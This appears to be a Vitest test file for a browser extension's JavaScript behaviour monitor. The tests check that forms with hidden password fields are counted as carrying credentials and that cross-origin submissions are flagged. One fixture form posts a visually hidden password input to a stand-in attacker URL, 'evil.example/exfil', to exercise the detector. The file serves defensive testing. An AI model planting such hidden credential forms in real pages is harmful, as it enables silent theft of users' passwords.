// @vitest-environment happy-dom
import { beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import {
  _resetState,
  formHasCredentialFields,
  initJsBehaviorMonitor,
} from "../extension/src/content/js_behavior_monitor";

type PostSignalFn = (type: string, payload?: Record<string, unknown>) => void;

const testFetch = vi.fn().mockResolvedValue(new Response());
const testXhrOpen = vi.fn();
const testXhrSend = vi.fn();
const testBeacon = vi.fn().mockReturnValue(true);

beforeAll(() => {
  window.fetch = testFetch as unknown as typeof window.fetch;
  XMLHttpRequest.prototype.open =
    testXhrOpen as unknown as typeof XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.send =
    testXhrSend as unknown as typeof XMLHttpRequest.prototype.send;
  navigator.sendBeacon = testBeacon as unknown as typeof navigator.sendBeacon;
});

beforeEach(() => {
  testFetch.mockClear();
  testXhrOpen.mockClear();
  testXhrSend.mockClear();
  testBeacon.mockClear();
  _resetState();
  document.body.innerHTML = "";
});

describe("credential-bearing form submission", () => {
  it("counts a visually hidden, non-disabled password control", () => {
    const form = document.createElement("form");
    form.innerHTML =
      '<input name="secret" type="password" style="display:none" value="not-observed">';

    expect(formHasCredentialFields(form)).toBe(true);
  });

  it("does not count a disabled password control", () => {
    const form = document.createElement("form");
    form.innerHTML = '<input name="secret" type="password" disabled>';

    expect(formHasCredentialFields(form)).toBe(false);
  });

  it("signals a cross-origin submit carrying a visually hidden password control", () => {
    const postSignal = vi.fn<PostSignalFn>();
    document.body.innerHTML = `
      <form action="https://evil.example/exfil">
        <input name="secret" type="password" style="visibility:hidden" value="not-observed">
      </form>
    `;
    const form = document.querySelector("form") as HTMLFormElement;

    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
    form.dispatchEvent(new SubmitEvent("submit", { bubbles: true }));

    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-form-submit-suspicious",
      expect.objectContaining({
        hasCredentialFields: true,
        isCrossOrigin: true,
        destinationOrigin: "https://evil.example",
      }),
    );
  });
});
